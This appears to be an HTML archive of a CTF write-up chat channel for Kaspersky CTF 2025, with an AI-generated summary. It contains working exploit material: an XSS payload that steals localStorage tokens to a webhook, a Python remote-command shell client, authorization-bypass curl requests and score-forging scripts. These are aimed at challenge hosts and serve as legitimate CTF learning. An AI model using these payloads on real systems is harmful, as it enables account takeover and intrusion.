@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CTFdi</title>
+  <style>
+    :root {
+        --primary: #ff2e63;   /* neon red/pink */
+        --secondary: #162447;
+        --accent: #08d9d6;    /* neon blue/cyan */
+        --background: #0a0a0f;
+        --surface: rgba(20, 20, 40, 0.9);
+        --text: #e6f1ff;
+    }
+
+    body {
+        font-family: 'Press Start 2P', monospace;
+        background-color: var(--background);
+        color: var(--text);
+        margin: 0;
+        padding: 20px;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        font-size: 14px; /* bigger font */
+    }
+
+    .chat {
+        width: 100%;
+        max-width: 800px;
+        height: 500px;
+        overflow-y: auto;
+        background: var(--surface);
+        border-radius: 8px;
+        box-shadow: 0 0 25px rgba(255, 46, 99, 0.3);
+        padding: 12px;
+        display: flex;
+        flex-direction: column-reverse;
+    }
+
+    .message {
+        margin: 12px 0;
+        padding: 10px;
+        border-radius: 6px;
+        background: rgba(15, 15, 25, 0.85);
+        box-shadow: 0 0 6px rgba(8, 217, 214, 0.3);
+        font-size: 14px;
+        line-height: 1.5;
+    }
+
+    .timestamp {
+        font-size: 11px;
+        color: var(--primary); /* red timestamps */
+        margin-bottom: 4px;
+        display: block;
+        opacity: 0.55;
+    }
+
+    #summary {
+        width: 100%;
+        max-width: 800px;
+        margin: 30px auto;
+        padding: 20px;
+        background: var(--surface);
+        line-height: 1.6;
+        border-radius: 8px;
+        box-shadow: 0 0 20px rgba(8, 217, 214, 0.3);
+        font-size: 14px;
+    }
+
+    .content a {
+        color: var(--accent); /* blue links */
+        text-decoration: none;
+        font-weight: bold;
+    }
+
+    .content a:hover {
+        opacity: 0.8;
+        text-decoration: underline;
+    }
+
+    /* CRT scanline effect */
+    .scanline {
+        background: linear-gradient(to bottom,
+            rgba(255, 255, 255, 0) 0%,
+            rgba(255, 255, 255, 0.05) 10%,
+            rgba(255, 255, 255, 0) 100%);
+        animation: scanline 8s linear infinite;
+        pointer-events: none;
+    }
+
+    @keyframes scanline {
+        0% { transform: translateY(-100%); }
+        100% { transform: translateY(100%); }
+    }
+</style>
+</head>
+<body>
+  <h1>Channel: [data/ctfs/kctf25/writeups_1411682333765140631.json]</h1>
+  <h3>Writeup Chat</h3>
+  <div id="chat" class="chat">
+    <div class="message">
+      <span class="timestamp">2025-09-02T07:22:28.754000+00:00</span>
+      <div class="content">you could using <a href="https://pyinstxtractor-web.netlify.app/" target="_blank">https://pyinstxtractor-web.netlify.app/</a> to got unpack files and you will see main.pyc using pymaror you could using <a href="https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot" target="_blank">https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot</a> to got source code of it (but you only needs pyarmor_runtime.so) then you will found this code
+
+```py
+# Source Generated with Decompyle++
+# File: main.pyc.1shot.seq (Python 3.13)
+
+'__pyarmor_enter_61139__(...)'
+__assert_armored__ = '__pyarmor_assert_61138__'
+from super_secret_malicious_dependencie import add_backdoor
+from flask import Flask
+app = Flask(__name__)
+index = None(app.get, '/')((lambda : '__pyarmor_enter_61142__(...)'__assert_armored__ = '__pyarmor_assert_61141__''__pyarmor_exit_61143__(...)''Would you find me?'))
+
+def main():
+    '__pyarmor_enter_61145__(...)'
+    __assert_armored__ = '__pyarmor_assert_61144__'
+    None(add_backdoor, app)
+    None(app.run, host = '0.0.0.0', port = 5000)
+    '__pyarmor_exit_61146__(...)'
+
+if __name__ == '__main__':
+    pass
+main()
+'__pyarmor_exit_61140__(...)'
+```
+
+then you could found super_secret_malicious_dependencie</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-01T21:54:56.726000+00:00</span>
+      <div class="content">Detailed solution for kaspersky, web/bubble-rerevenge
+<a href="https://github.com/S450R1/kaspersky-ctf-writeups/tree/main/web/bubble-rerevenge" target="_blank">https://github.com/S450R1/kaspersky-ctf-writeups/tree/main/web/bubble-rerevenge</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-01T19:16:51.056000+00:00</span>
+      <div class="content">&lt;@745286245092950097&gt;  author writeup for fish game
+
+1. google "godot reverse" -&gt; find a tool <a href="https://github.com/GDRETools/gdsdecomp" target="_blank">https://github.com/GDRETools/gdsdecomp</a>
+2. open the source code and explore how sending the score to the server works
+3. on opening of the scene it gets the session token by making a GET request to /get_token
+4. when you send the score, the game does this:
+```
+var data_json = JSON.stringify({
+        "token": Registry.token,
+        "username": $Control/VBoxContainer/TextEdit.text,
+        "score": Registry.asd / 123,
+        "verify": calculate(Registry.token + "_" + str(Registry.asd))
+    })
+```
+5. So, in the exploit, as well as getting the token, you need to calculate the "verify" value. you can rewrite the code from the same file in python
+```
+func calculate(st: String) -&gt; String:
+    var x = 0
+    for i in range(len(st)):
+        x += st.unicode_at(i)
+        x *= 2
+        x %= 2**64
+        
+    return "%x" % x
+```
+
+6. The final exploit should look like this:
+```
+token = curl <a href="https://fishgame.task.sasc.tf/get_token" target="_blank">https://fishgame.task.sasc.tf/get_token</a>
+username = "any string"
+verify = calculate(token + "_" + str(6000*123))
+
+curl <a href="https://fishgame.task.sasc.tf/set_score" target="_blank">https://fishgame.task.sasc.tf/set_score</a> --json '{"username": username, "score": 6000, "token": token, "verify": verify}'
+
+curl <a href="https://fishgame.task.sasc.tf/get_prize/&lt;token&gt;" target="_blank">https://fishgame.task.sasc.tf/get_prize/&lt;token&gt;</a>
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-01T17:39:00.894000+00:00</span>
+      <div class="content">Author's solution to `Bombastic` challenge
+
+1. As obvious from the description, check dockerhub for a container named **bombastic**
+2. The container itself has a python module which is protected by pyarmor. Going straight with it might be harder and more time consuming, so it's better to check other datasources first
+3. Check OCI using `oras discover docker.io/kaspctf/bombastic:latest`
+4. From there you can find `application/vnd.sbom+json` with the digest `sha256:cc42156be710c5d25a13772fea31e48ef41b34ea88893e31cc22df77939fed12`
+5. `oras pull docker.io/kaspctf/bombastic@sha256:cc42156be710c5d25a13772fea31e48ef41b34ea88893e31cc22df77939fed12 -o out-dir`
+6. Read `sbom.jsom` where you can find
+```
+{
+      "bom-ref": "requirements-L117",
+      "description": "requirements line 117: super-duper-secret-malicious-dependencie==0.2.0     --hash=sha256:38e3c2a987d69be26449b2f287b4d370f8db331cafbb7f57d04cb157d58b51eb     --hash=sha256:e44ac2cd1ac5e53f063052056fef2b48defcc14d35d8e8009b411f6e66c9c186",
+      "externalReferences": [
+        {
+          "comment": "implicit dist url",
+          "hashes": [
+            {
+              "alg": "SHA-256",
+              "content": "38e3c2a987d69be26449b2f287b4d370f8db331cafbb7f57d04cb157d58b51eb"
+            },
+            {
+              "alg": "SHA-256",
+              "content": "e44ac2cd1ac5e53f063052056fef2b48defcc14d35d8e8009b411f6e66c9c186"
+            }
+          ],
+          "type": "distribution",
+          "url": "<a href="https://pypi.org/simple/super-duper-secret-malicious-dependencie/"" target="_blank">https://pypi.org/simple/super-duper-secret-malicious-dependencie/"</a>
+        }
+      ],
+      "name": "super-duper-secret-malicious-dependencie",
+      "purl": "pkg:pypi/super-duper-secret-malicious-dependencie@0.2.0",
+      "type": "library",
+      "version": "0.2.0"
+    },
+```
+7. The malicious package is already removed from the pypi, but using the hash you can check if it's been uploaded to virustotal (which happens automatically for all packages)</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-01T11:03:31.180000+00:00</span>
+      <div class="content"><a href="https://obf-io.deobfuscate.io/" target="_blank">https://obf-io.deobfuscate.io/</a> i put it in this, it took a lot of time but i got the deobfuscated code</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-01T07:23:14.522000+00:00</span>
+      <div class="content">Detailed solution for kaspersky, web/bubble-revenge:
+
+<a href="https://github.com/S450R1/kaspersky-ctf-writeups/tree/main/web/bubble-revenge" target="_blank">https://github.com/S450R1/kaspersky-ctf-writeups/tree/main/web/bubble-revenge</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-01T07:20:16.274000+00:00</span>
+      <div class="content"><a href="https://github.com/IMSHOX/CTF-Kaspersky-25-AI" target="_blank">https://github.com/IMSHOX/CTF-Kaspersky-25-AI</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-01T03:55:48.755000+00:00</span>
+      <div class="content">Detailed solution for kaspersky, web/k-newswire:
+
+<a href="https://github.com/S450R1/kaspersky-ctf-writeups/tree/main/web/k-newswire" target="_blank">https://github.com/S450R1/kaspersky-ctf-writeups/tree/main/web/k-newswire</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-31T16:55:11.695000+00:00</span>
+      <div class="content"><a href="https://ibb.co/B2rWFLms" target="_blank">https://ibb.co/B2rWFLms</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-31T14:35:53.383000+00:00</span>
+      <div class="content">```py
+import requests
+import sys
+from urllib.parse import quote
+
+TARGET_URL = "<a href="https://af9b68dc-a875-4c70-bf7d-5697bf4919c6.kit.sasc.tf/super/secret/route/you/never/find/it"" target="_blank">https://af9b68dc-a875-4c70-bf7d-5697bf4919c6.kit.sasc.tf/super/secret/route/you/never/find/it"</a>
+
+def run_command(cmd):
+    if not cmd.strip():
+        return ""
+
+    params = {'cmd': cmd}
+    
+    try:
+        response = requests.post(TARGET_URL, params=params, timeout=15)
+        
+        if response.status_code == 200:
+            return response.text
+        else:
+            return f"Erro {response.status_code}:\n{response.text}"
+        
+    except requests.exceptions.RequestException as e:
+        return f"Erro na conexão: {e}"
+
+def main():
+    print("--- Shell RCE --- ")
+    print(f"[*] Conectando ao alvo: {TARGET_URL}")
+    
+    while True:
+        try:
+            command = input("&gt;&gt; ")
+            
+            if command.lower() in ["exit", "quit"]:
+                print("[*] Saindo do shell.")
+                break
+            
+            result = run_command(command)
+            print(result)
+
+        except KeyboardInterrupt:
+            print("\n[*] Saindo do shell (Ctrl+C).")
+            break
+        except Exception as e:
+            print(f"Erro inesperado: {e}")
+
+if __name__ == "__main__":
+    main()
+```
+&lt;@691250042329366548&gt; i made this script to speed up things a little</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-31T14:25:48.139000+00:00</span>
+      <div class="content">sorry i got confudes :P, i ran into this same problem, then i used this script:
+<a href="https://github.com/extremecoders-re/pyinstxtractor" target="_blank">https://github.com/extremecoders-re/pyinstxtractor</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-31T13:06:44.470000+00:00</span>
+      <div class="content">Just compute the discrete logarithm. I've used sage, like here: <a href="https://stackoverflow.com/questions/40341390/sage-implementation-of-discrete-logarithm-in-subgroup-of-group-of-units#40344729" target="_blank">https://stackoverflow.com/questions/40341390/sage-implementation-of-discrete-logarithm-in-subgroup-of-group-of-units#40344729</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-31T12:56:36.373000+00:00</span>
+      <div class="content"><a href="https://cryptohack.org/challenges/diffie-hellman/" target="_blank">https://cryptohack.org/challenges/diffie-hellman/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-31T12:47:08.190000+00:00</span>
+      <div class="content"><a href="https://www.alpertron.com.ar/DILOG.HTM" target="_blank">https://www.alpertron.com.ar/DILOG.HTM</a> this one will do the job</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-31T12:25:11.509000+00:00</span>
+      <div class="content">## photo stock
+
+- found the seed data showing admin user "administrator" with note "mvp_note"
+- login and see notes and found admin's note ID: `b75c4dcf-ef7a-48db-be16-3bdc4017367d` with status: "privacy":"private"
+- then create own note
+- exploit inconsistent authorization logic
+```
+curl -X PATCH '<a href="https://[target]/api/notes/public?id=b75c4dcf-ef7a-48db-be16-3bdc4017367d'" target="_blank">https://[target]/api/notes/public?id=b75c4dcf-ef7a-48db-be16-3bdc4017367d'</a> \
+  -H 'Authorization: Bearer [token]' \
+  -d '["&lt;own_note_id&gt;"]'
+```
+- access flag
+```
+curl -H "Authorization: Bearer [token]" \
+  <a href="https://[target]/api/notes/b75c4dcf-ef7a-48db-be16-3bdc4017367d/image" target="_blank">https://[target]/api/notes/b75c4dcf-ef7a-48db-be16-3bdc4017367d/image</a> \
+  --output flag.jpg
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-31T12:17:39.388000+00:00</span>
+      <div class="content">Beta Test
+For now, only exploit with comments and task sources
+<a href="https://github.com/s41nt0l3xus/CTF-writeups/tree/master/KasperskyCTF/beta-test" target="_blank">https://github.com/s41nt0l3xus/CTF-writeups/tree/master/KasperskyCTF/beta-test</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-31T12:17:10.319000+00:00</span>
+      <div class="content"><a href="https://gist.github.com/0x1622/fed3547c846e4a799fe4ae751fbf42ec" target="_blank">https://gist.github.com/0x1622/fed3547c846e4a799fe4ae751fbf42ec</a>
+The reverse webgpu chall solve</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-31T12:17:04.471000+00:00</span>
+      <div class="content">Writeup: K-Newswire (lil bit AI help for this writeup )
+
+ Challenge Overview
+
+We were given a service running at:
+
+
+<a href="http://k-newswire.task.sasc.tf:8000" target="_blank">http://k-newswire.task.sasc.tf:8000</a>
+
+
+At first glance, it looks like a news application with a front-end served over HTTP and some kind of real-time updates happening behind the scenes. The task was to retrieve the hidden flag.
+
+---
+ 
+Recon
+
+Inspecting the static assets, I found an interesting bundled JavaScript file:
+
+
+`<a href="http://k-newswire.task.sasc.tf:8000/assets/index-CrDw9_mc.js`" target="_blank">http://k-newswire.task.sasc.tf:8000/assets/index-CrDw9_mc.js`</a>
+
+
+Looking inside, there was a clear reference to a WebSocket client:
+
+`ws://k-newswire.task.sasc.tf:8000/socket.io/?EIO=4&amp;transport=websocket`
+
+
+Even more interestingly, the JS defined some *rooms* used by the app:
+
+```js
+const kh = Object.freeze({
+  public: "public",
+  secret_announcements: "secret_announcements"
+});
+```
+
+So the app connects users to the public room normally, but there exists a *hidden room* called secret_announcements.
+
+---
+
+Exploitation
+
+To interact with the socket, I wrote a quick Python script using python-socketio:
+
+```python
+import socketio
+
+sio = socketio.Client()
+
+@sio.event
+def connect():
+    print(":white_check_mark: Connected!")
+
+@sio.on("*")  # catch-all handler
+def catch_all(event, data):
+    print(":envelope_with_arrow:", event, data)
+
+sio.connect("ws://k-newswire.task.sasc.tf:8000", transports=["websocket"])
+
+# normal users get only this:
+sio.emit("join", {"room": "public"})
+
+# but let's try the hidden room:
+sio.emit("join", {"room": "secret_announcements"})
+
+sio.wait()
+```
+
+Running this script, the server happily let me into the secret_announcements room and pushed a private broadcast and gave us the flag</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-31T12:16:22.485000+00:00</span>
+      <div class="content"><a href="https://gist.github.com/AliceLacie/be38d32b34930db1f79d045819ac40bb" target="_blank">https://gist.github.com/AliceLacie/be38d32b34930db1f79d045819ac40bb</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-31T12:13:00.315000+00:00</span>
+      <div class="content">Bubble : Revenge
+```
+[img width="1 onerror=try{let/**/j='';for(let/**/i=0;i&lt;localStorage.length;i++){let/**/v=localStorage.getItem(localStorage.key(i));console.log(v);if(v&amp;&amp;v.includes('ey')){j=v;break}}if(!j){}else{(new/**/Image).src='<a href="https://webhook.site/39a15901-608a-4dbf-b46b-8b49d6b97278?d='+encodeURIComponent(j)}}catch(e){console.log(e);}"]x[/img]" target="_blank">https://webhook.site/39a15901-608a-4dbf-b46b-8b49d6b97278?d='+encodeURIComponent(j)}}catch(e){console.log(e);}"]x[/img]</a>
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-31T12:12:17.318000+00:00</span>
+      <div class="content">REPL
+Sorry, for now don't have enough time for meme-driven cool story writeup, but here is task author's sources and solution TL;DR
+<a href="https://github.com/s41nt0l3xus/CTF-writeups/tree/master/KasperskyCTF/REPL" target="_blank">https://github.com/s41nt0l3xus/CTF-writeups/tree/master/KasperskyCTF/REPL</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-31T12:05:26.022000+00:00</span>
+      <div class="content">Bubble: ReRevenge - <a href="https://gist.github.com/as3617/25537beb3acaddc2ad4d025e6c08d29b" target="_blank">https://gist.github.com/as3617/25537beb3acaddc2ad4d025e6c08d29b</a>
+Peach Investor - <a href="https://gist.github.com/as3617/847b23be47633b9e626bc404458deef6" target="_blank">https://gist.github.com/as3617/847b23be47633b9e626bc404458deef6</a></div>
+    </div>
+  </div>
+  <h3>Gemini Chat Summary</h3>
+  <section id="summary">
+<div style="font-family: Arial, sans-serif; line-height: 1.6; color: #333; border: 1px solid #ddd; padding: 20px; border-radius: 8px; background-color: #f9f9f9;">
+
+    <h2 style="border-bottom: 2px solid #eee; padding-bottom: 10px; color: #2c3e50;">Comprehensive Summary of CTF Challenge Solutions</h2>
+
+    <p>This document provides a detailed breakdown of various Capture The Flag (CTF) challenge solutions and techniques discussed in the conversation. The solutions span across web exploitation, reverse engineering, and forensics.</p>
+
+    <!-- Kaspersky: Bombastic -->
+    <details open style="margin-bottom: 15px; border-left: 3px solid #3498db; padding-left: 15px;">
+        <summary style="font-weight: bold; font-size: 1.2em; cursor: pointer; color: #3498db;">Kaspersky CTF: "Bombastic" &amp; Malicious Dependency Analysis</summary>
+        <div style="padding-top: 10px;">
+            <p>The solution for the "Bombastic" challenge involved a multi-faceted approach to analyze a Python application protected by Pyarmor.</p>
+            <h4>Method 1: Decompilation</h4>
+            <ol>
+                <li><strong>Unpack Executable:</strong> The initial executable was unpacked using the web-based tool <a href="https://pyinstxtractor-web.netlify.app/" target="_blank">pyinstxtractor-web</a>.</li>
+                <li><strong>Decompile Pyarmor Code:</strong> The resulting <code>main.pyc</code> file was decompiled using <a href="https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot" target="_blank">Pyarmor-Static-Unpack-1shot</a> to recover the source code.</li>
+                <li><strong>Code Analysis:</strong> The recovered code revealed a Flask application that imported and used a backdoor from a dependency named <code>super_secret_malicious_dependencie</code>.
+                    <pre style="background-color: #2d2d2d; color: #f1f1f1; padding: 15px; border-radius: 5px; overflow-x: auto;"><code># Source Generated with Decompyle++
+from super_secret_malicious_dependencie import add_backdoor
+from flask import Flask
+app = Flask(__name__)
+
+@app.get('/')
+def index():
+    return 'Would you find me?'
+
+def main():
+    add_backdoor(app)
+    app.run(host = '0.0.0.0', port = 5000)
+
+if __name__ == '__main__':
+    main()</code></pre>
+                </li>
+            </ol>
+            <h4>Method 2: SBOM Analysis</h4>
+            <p>A more direct method involved analyzing the container's Software Bill of Materials (SBOM).</p>
+            <ol>
+                <li><strong>Discover OCI Artifacts:</strong> The <code>oras discover</code> command was used to find artifacts associated with the Docker container.
+                    <pre style="background-color: #2d2d2d; color: #f1f1f1; padding: 10px; border-radius: 4px;"><code>oras discover docker.io/kaspctf/bombastic:latest</code></pre>
+                </li>
+                <li><strong>Identify SBOM:</strong> The output revealed an SBOM with the digest <code>sha256:cc42156...</code>.</li>
+                <li><strong>Pull SBOM:</strong> The SBOM JSON file was pulled using <code>oras pull</code>.</li>
+                <li><strong>Analyze SBOM for Malicious Package:</strong> The <code>sbom.json</code> file contained an entry for <code>super-duper-secret-malicious-dependencie</code>, including its version and SHA-256 hashes, despite it being removed from PyPI.
+                    <pre style="background-color: #2d2d2d; color: #f1f1f1; padding: 15px; border-radius: 5px; overflow-x: auto;"><code>{
+  "name": "super-duper-secret-malicious-dependencie",
+  "version": "0.2.0",
+  "externalReferences": [
+    {
+      "hashes": [
+        { "alg": "SHA-256", "content": "38e3c2a987d6..." },
+        { "alg": "SHA-256", "content": "e44ac2cd1ac5..." }
+      ],
+      "type": "distribution",
+      "url": "https://pypi.org/simple/super-duper-secret-malicious-dependencie/"
+    }
+  ]
+}</code></pre>
+                </li>
+                <li><strong>Code Recovery:</strong> The package's hash was used to find it on VirusTotal (which automatically archives PyPI packages), and an online deobfuscator was used to recover the source code.</li>
+            </ol>
+        </div>
+    </details>
+
+    <!-- Godot Fish Game -->
+    <details style="margin-bottom: 15px; border-left: 3px solid #2ecc71; padding-left: 15px;">
+        <summary style="font-weight: bold; font-size: 1.2em; cursor: pointer; color: #2ecc71;">Kaspersky CTF: "Fish Game" (Godot Reverse Engineering)</summary>
+        <div style="padding-top: 10px;">
+            <p>This challenge required reversing a game made with the Godot engine to submit a high score.</p>
+            <ol>
+                <li><strong>Decompilation:</strong> The Godot game's source code was recovered using <a href="https://github.com/GDRETools/gdsdecomp" target="_blank">gdsdecomp</a>.</li>
+                <li><strong>Token Acquisition:</strong> Analysis showed the game first obtains a session token via a <code>GET</code> request to <code>/get_token</code>.</li>
+                <li><strong>Score Submission Logic:</strong> The score submission process involved sending a JSON payload containing a <code>verify</code> key. This key was calculated based on the token and the score.</li>
+                <li><strong>Rewriting the Verification Function:</strong> The verification algorithm from the game's script was ported from GDScript to Python.
+                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                        <div style="flex: 1; min-width: 300px;">
+                            <strong>GDScript (Original)</strong>
+                            <pre style="background-color: #2d2d2d; color: #f1f1f1; padding: 10px; border-radius: 4px;"><code>func calculate(st: String) -> String:
+    var x = 0
+    for i in range(len(st)):
+        x += st.unicode_at(i)
+        x *= 2
+        x %= 2**64
+    return "%x" % x</code></pre>
+                        </div>
+                        <div style="flex: 1; min-width: 300px;">
+                            <strong>Python (Ported)</strong>
+                             <pre style="background-color: #2d2d2d; color: #f1f1f1; padding: 10px; border-radius: 4px;"><code>def calculate(st: str) -> str:
+    x = 0
+    for char in st:
+        x += ord(char)
+        x *= 2
+        x %= 2**64
+    return f"{x:x}"</code></pre>
+                        </div>
+                    </div>
+                </li>
+                <li><strong>Exploitation:</strong> The final exploit involved a sequence of <code>curl</code> requests to get the token, calculate the verification hash for a forged high score, submit the score, and claim the prize.</li>
+            </ol>
+        </div>
+    </details>
+
+    <!-- K-Newswire -->
+    <details style="margin-bottom: 15px; border-left: 3px solid #e67e22; padding-left: 15px;">
+        <summary style="font-weight: bold; font-size: 1.2em; cursor: pointer; color: #e67e22;">Kaspersky CTF: "K-Newswire" (WebSocket Exploitation)</summary>
+        <div style="padding-top: 10px;">
+            <p>This web challenge was solved by identifying and joining a hidden WebSocket room.</p>
+            <ol>
+                <li><strong>Reconnaissance:</strong> Inspecting the site's JavaScript assets revealed a WebSocket endpoint and the existence of two rooms: <code>public</code> and <code>secret_announcements</code>.</li>
+                <li><strong>Exploitation:</strong> A Python script using the <code>python-socketio</code> library was written to connect to the WebSocket server.</li>
+                <li><strong>Joining the Secret Room:</strong> While normal users only join the <code>public</code> room, the script was modified to also send a request to join the <code>secret_announcements</code> room.</li>
+                <li><strong>Flag Retrieval:</strong> The server accepted the request and broadcasted the flag to all members of the secret room.
+                    <pre style="background-color: #2d2d2d; color: #f1f1f1; padding: 15px; border-radius: 5px; overflow-x: auto;"><code>import socketio
+
+sio = socketio.Client()
+
+@sio.event
+def connect():
+    print("Connected!")
+    # Join the hidden room upon connection
+    sio.emit("join", {"room": "secret_announcements"})
+
+@sio.on("*")
+def catch_all(event, data):
+    print(f"Received event '{event}': {data}")
+
+sio.connect("ws://k-newswire.task.sasc.tf:8000", transports=["websocket"])
+sio.wait()</code></pre>
+                </li>
+            </ol>
+        </div>
+    </details>
+
+    <!-- Photo Stock -->
+    <details style="margin-bottom: 15px; border-left: 3px solid #9b59b6; padding-left: 15px;">
+        <summary style="font-weight: bold; font-size: 1.2em; cursor: pointer; color: #9b59b6;">Kaspersky CTF: "Photo Stock" (Authorization Bypass)</summary>
+        <div style="padding-top: 10px;">
+            <p>This challenge was solved by exploiting an inconsistent authorization vulnerability in the API.</p>
+            <ol>
+                <li><strong>Discovery:</strong> Found admin user's note ID (<code>b75c4dcf-...</code>) which was marked as private.</li>
+                <li><strong>Vulnerability:</strong> An API endpoint (<code>/api/notes/public</code>) allowed users to modify the public status of notes. It improperly authorized changes to arbitrary note IDs.</li>
+                <li><strong>Exploitation:</strong> A <code>PATCH</code> request was sent to this endpoint, passing the admin's private note ID as a query parameter. This action effectively made the admin's note public by associating it with the attacker's own note.
+                    <pre style="background-color: #2d2d2d; color: #f1f1f1; padding: 10px; border-radius: 4px;"><code># Make the admin's private note public
+curl -X PATCH 'https://[target]/api/notes/public?id=b75c4dcf-ef7a-48db-be16-3bdc4017367d' \
+  -H 'Authorization: Bearer [token]' \
+  -d '["&lt;own_note_id&gt;"]'</code></pre>
+                </li>
+                <li><strong>Access Flag:</strong> With the note now public, the associated flag image could be downloaded.
+                    <pre style="background-color: #2d2d2d; color: #f1f1f1; padding: 10px; border-radius: 4px;"><code># Download the flag image
+curl -H "Authorization: Bearer [token]" \
+  https://[target]/api/notes/b75c4dcf-ef7a-48db-be16-3bdc4017367d/image \
+  --output flag.jpg</code></pre>
+                </li>
+            </ol>
+        </div>
+    </details>
+
+    <!-- Bubble: Revenge -->
+    <details style="margin-bottom: 15px; border-left: 3px solid #e74c3c; padding-left: 15px;">
+        <summary style="font-weight: bold; font-size: 1.2em; cursor: pointer; color: #e74c3c;">Kaspersky CTF: "Bubble: Revenge" (XSS)</summary>
+        <div style="padding-top: 10px;">
+            <p>This challenge involved a Cross-Site Scripting (XSS) payload designed to steal data from <code>localStorage</code>.</p>
+            <p>The payload was embedded within a BBCode <code>[img]</code> tag's `width` attribute, using an `onerror` event to trigger the script.</p>
+            <pre style="background-color: #2d2d2d; color: #f1f1f1; padding: 15px; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; word-break: break-all;"><code>[img width="1 onerror=try{let j='';for(let i=0;i&lt;localStorage.length;i++){let v=localStorage.getItem(localStorage.key(i));if(v&&v.includes('ey')){j=v;break}}if(j){(new Image).src='https://webhook.site/...?d='+encodeURIComponent(j)}}catch(e){}"]x[/img]</code></pre>
+            <strong>Payload Breakdown:</strong>
+            <ul>
+                <li><code>width="1 onerror=..."</code>: Creates a tiny, invalid image to trigger the <code>onerror</code> event handler.</li>
+                <li>The script iterates through all items in <code>localStorage</code>.</li>
+                <li>It searches for a value containing "ey" (a common substring in base64-encoded JWTs).</li>
+                <li>If found, it exfiltrates this value to an external webhook by setting it as the query parameter of a new image source.</li>
+            </ul>
+        </div>
+    </details>
+
+</div>
+  </section>
+  <script>
+    // Force chat to start at the bottom (newest messages)
+    const chat = document.getElementById("chat");
+    chat.scrollTop = chat.scrollHeight;
+  </script>
+</body>
+</html>
